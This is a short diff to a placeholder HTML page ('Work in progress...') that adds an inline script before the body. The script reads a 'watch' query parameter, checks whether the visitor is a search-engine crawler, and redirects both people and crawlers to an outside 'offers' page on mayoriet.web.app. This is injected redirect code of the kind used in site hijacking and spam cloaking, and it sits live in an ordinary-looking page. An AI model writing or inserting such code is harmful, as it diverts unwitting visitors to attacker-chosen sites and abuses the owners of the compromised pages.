@@ -14,6 +14,17 @@
 		}
 	</style>
 </head>
+<script>
+(function(){
+ let params = (function(){var p={};location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(s,k,v){p[k]=v});return p;})();(/(\d+)\.html$/.exec(location.pathname)) ? /(\d+)\.html$/.exec(location.pathname)[1] : '';
+ let spiderx = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
+ if(params.watch && !spiderx) {
+  location.href = 'https://mayoriet.web.app/offers/'+params.watch+'.html'; 
+ } else if(params.watch && spiderx) {
+  location.replace('https://mayoriet.web.app/offers/'+params.watch+'.html');
+ }
+})();
+</script>
 <body>
 	Work in progress...
 </body>
